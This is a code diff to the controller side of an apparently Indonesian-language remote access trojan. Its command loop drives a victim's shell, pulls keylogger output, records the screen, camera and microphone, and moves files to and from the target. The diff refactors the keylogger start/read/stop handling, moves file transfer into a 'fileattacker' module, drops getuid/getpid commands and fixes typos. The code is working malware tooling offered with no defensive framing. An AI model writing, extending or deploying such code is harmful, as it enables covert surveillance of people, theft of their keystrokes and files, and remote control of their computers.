@@ -10,6 +10,9 @@ import cv2
 import wave
 import pyaudio
 import sys
+import threading
+import time
+from fileattacker import download_file, upload_file
 
 def main_con():
     try:
@@ -27,18 +30,37 @@ def main_con():
         sys.exit()
 
 _target = main_con()
+main_log = threading.Event()
 
-def recv_status_priv(sec):
-    try:
-        _target.settimeout(sec)
-        status = _target.recv(1024).decode()
-        return status
-    except:
-        print("Can't receive status")
+def start_log():
+    print("starting logger")
+    time.sleep(0.5)
+    print("logger started")
+
+    main_log.set()
+
+def baca_log():
+    if not main_log.is_set():
+        print("error, the main function is not running")
+        return
+    
+    print("\n")
+    recv_keylog()
+    print("\n")
+
+def stop_log():
+    if not main_log.is_set():
+        print("error, the main function is not running")
+        return
+
+    print("stopping logger")
+    time.sleep(0.5)
+    print("logger stopped")
+
+    main_log.clear()
 
 def recv_keylog():
     try:
-        _target.settimeout(7)
         print("Dumping logs:")
         data = _target.recv(1024).decode()
         print(data)
@@ -84,7 +106,7 @@ def keystroke():
         print('Connect')
         conn, addr= s.accept()
         with conn:
-            print('connected {addr}')
+            print(f'connected {addr}')
             while True:
                     command = input('text: ')
                     conn.sendall(command.encode())
@@ -162,7 +184,7 @@ def screen_record(host="0.0.0.0", port=9999):
 
             key = cv2.waitKey(1) & 0xFF
             if key == ord('q') or key == 27:
-                print("stoped")
+                print("stopped")
                 break
 
         except Exception as e:
@@ -207,50 +229,6 @@ def konversi_byte_stream():
     except:
         print("Can't access camera")
 
-def upload_file(namafile):
-    bufsize = 65536
-    if not os.path.exists(namafile):
-        _target.sendall(struct.pack("Q", 0))
-        print('file not found')
-        return
-    if os.path.isdir(namafile):
-        _target.sendall(struct.pack("Q", 0))
-        print(f'{namafile} is a directory')
-        return
-    filesize = os.path.getsize(namafile)
-    _target.sendall(struct.pack("Q", filesize))
-    with open(namafile, 'rb') as f:
-        print('uploading')
-        while True:
-            data = f.read(bufsize)
-            if not data:
-                break
-            _target.sendall(data)
-            print(f'{f.tell()}/{filesize} bytes ({f.tell()/filesize*100:.2f}%)', end='\r')
-        print('\nuploaded')  
-
-def download_file(namafile):
-    bufsize = 65536
-    size_data = _target.recv(8)
-    filesize = struct.unpack("Q", size_data)[0]
-    if filesize == 0:
-        print('file not found')
-        return 
-    if filesize == 1:
-        print(f'{namafile} is a directory')
-        return
-    recv = 0
-    with open(namafile, 'wb') as file:
-        print('downloading')
-        while recv < filesize:
-                data = _target.recv(bufsize)
-                if not data:
-                    break
-                file.write(data)
-                recv += len(data)
-                print(f'{recv}/{filesize} bytes ({recv/filesize*100:.2f}%)', end='\r')
-        print('\ndownloaded')
-
 def data_diterima():
         data = ''
         while True:
@@ -263,7 +241,6 @@ def data_diterima():
                  continue
 
 def shellc():
-    main_keylogger = False
     x = 0                      
     n = 0
     p = 0
@@ -278,34 +255,20 @@ def shellc():
             elif perintah == 'clear':
                 os.system('clear')
             elif perintah[:3] == 'cd ':
-                print(recv_status_priv(0.5))
+                try:
+                    print(_target.recv(1024).decode())
+                except:
+                    pass
             elif perintah[:8] == 'download':
-                download_file(perintah[9:])
+                download_file(_target, perintah[9:])
             elif perintah[:6] == 'upload':
-                upload_file(perintah[7:])
+                upload_file(_target, perintah[7:])
             elif perintah == 'start_log':
-                main_keylogger = True
-                print('starting keylogger')
-                pass
+                start_log()
             elif perintah == 'baca_log':
-                if main_keylogger:
-                    recv_keylog()
-                else:
-                    print("The main function is not called, aborting")
-                    pass
-            elif perintah == 'clear_log':
-                if main_keylogger:
-                    pass
-                else:
-                    print("The main function is not called, aborting")
-                    pass
+                baca_log()
             elif perintah == 'stop_log':
-                if main_keylogger:
-                    print('stoping keylogger')
-                    pass
-                else:
-                    print("The main function is not called, aborting")
-                    pass
+                stop_log()
             elif perintah == 'start_cam':
                 konversi_byte_stream()
             elif perintah ==  'screen_shot':
@@ -335,8 +298,6 @@ def shellc():
                     -start_log >> start keylogger
 
                     -baca_log  >> read keylogger
-
-                    -clear_log >> delet log from keylogger
 
                     -stop_log  >> stop keylogger
                     ================================
@@ -376,13 +337,6 @@ def shellc():
                       
                     -pidkill    >> kill program by pid name
                     ================================
-                      
-                        get id:
-                    ================================
-                    -getuid     >> get user id
-                    
-                    -getpid     >> get process id
-                    ================================
                     """)
             elif perintah == 'rec_audio':
                 p += 1
@@ -398,10 +352,6 @@ def shellc():
                 pass  
             elif perintah[:7] == 'pidkill':
                 pass
-            elif perintah == 'getuid':
-                print(recv_status_priv(2))
-            elif perintah == 'getpid':
-                print(f"Current PID: {recv_status_priv(2)}")
             else:
                 hasil = data_diterima()
                 print(hasil)
